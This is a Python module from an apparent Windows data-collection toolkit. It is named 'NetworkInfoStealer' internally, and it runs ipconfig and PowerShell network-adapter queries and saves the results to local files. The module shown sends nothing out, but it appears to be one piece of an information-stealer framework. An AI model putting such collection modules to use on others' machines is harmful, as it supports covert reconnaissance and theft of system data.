import os
import subprocess

from config import ModuleManager


class NetworkInfoRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "NetworkInfoStealer")
        
        self.banner(r"""
     _______         _______                               _       
    |.-----.|       (_______)        _                    | |      
    ||x . x||        _     _ _____ _| |_ _ _ _  ___   ____| |  _   
    ||_.-._||       | |   | | ___ (_   _) | | |/ _ \ / ___) |_/ )  
    `--)-(--`       | |   | | ____| | |_| | | | |_| | |   |  _ (  
   __[=== o]___     |_|   |_|_____)  \__)\___/ \___/|_|   |_| \_)  
  |:::::::::::|\    
  `-=========-`()                   Information
                    """)

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'network')
        self.ipconfig_filename = os.path.join(self.systeminfo_folder, 'ipconfig.txt')
        self.ipconfiguration_filename = os.path.join(self.systeminfo_folder, 'ipconfiguration.txt')
        self.physical_adapters_filename = os.path.join(self.systeminfo_folder, 'physical_adapters.txt')
        self.getnet_ipconfig_filename = os.path.join(self.systeminfo_folder, 'getnet_ipinfo.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
    def ipconfig(self) -> None:
        self.mdebug("[ipconfig] Running command: `ipconfig /all`")
        data = subprocess.check_output(['ipconfig', '/all']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[ipinfo] Saved result to {self.ipconfig_filename}")
    
    def ipconfiguration(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell get-wmiobject Win32_NetworkAdapterConfiguration`")
        data = subprocess.check_output(['powershell', 'get-wmiobject Win32_NetworkAdapterConfiguration']).decode('utf-8', errors="backslashreplace")
        with open(self.ipconfiguration_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[ipconfiguration] Saved result to {self.ipconfiguration_filename}")
        
    def physical_adapters(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell Get-NetAdapter -physical| where status -eq 'up'`")
        data = subprocess.check_output(['powershell', "Get-NetAdapter -physical| where status -eq 'up'"]).decode('utf-8', errors="backslashreplace")
        with open(self.physical_adapters_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[physical_adapters] Saved result to {self.physical_adapters_filename}")
    
    def getnet_ipconfig(self) -> None:
        self.mdebug("[ipconfig] Running command: `powershell Get-NetIPConfiguration -All`")
        data = subprocess.check_output(['powershell', "Get-NetIPConfiguration -All"]).decode('utf-8', errors="backslashreplace")
        with open(self.getnet_ipconfig_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[getnet_ipconfig] Saved result to {self.getnet_ipconfig_filename}")
    
    def run(self) -> None:
        __funcs__ = (
            'ipconfig', 'ipconfiguration', 
            'physical_adapters', 'getnet_ipconfig'
        )
        
        for func_name in __funcs__:
            try:
                self.mdebug(f"Running function `{func_name}()`")
                func = getattr(self, func_name)
                func()
            except (FileNotFoundError, subprocess.CalledProcessError):
                self.merror(f"[{func_name}] Unable to run `{func_name}()`")
            except Exception as e:
                self.merror(f"[{func_name}] Unable to run `{func_name}()` -> {e}")
                